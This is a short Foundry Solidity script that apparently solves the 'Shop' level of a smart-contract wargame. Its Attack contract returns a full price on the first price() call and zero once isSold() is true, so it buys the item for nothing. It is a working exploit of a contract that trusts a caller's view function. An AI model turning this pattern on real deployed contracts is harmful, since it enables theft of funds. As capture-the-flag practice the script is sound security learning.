// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Shop} from "../src/21_Shop.sol";
import {Script, console} from "forge-std/Script.sol";

contract ShopSolve is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack().pwn();
        vm.stopBroadcast();
    }
}

contract Attack {
    Shop shop = Shop(0x6ccd555f5dD90e1239371c4E4c4f4B498ACC802d);

    function pwn() external {
        shop.buy();
        console.log(shop.isSold());
    }

    function price() external view returns (uint256) {
        if (shop.isSold()) {
            return 0;
        }
        return shop.price();
    }
}
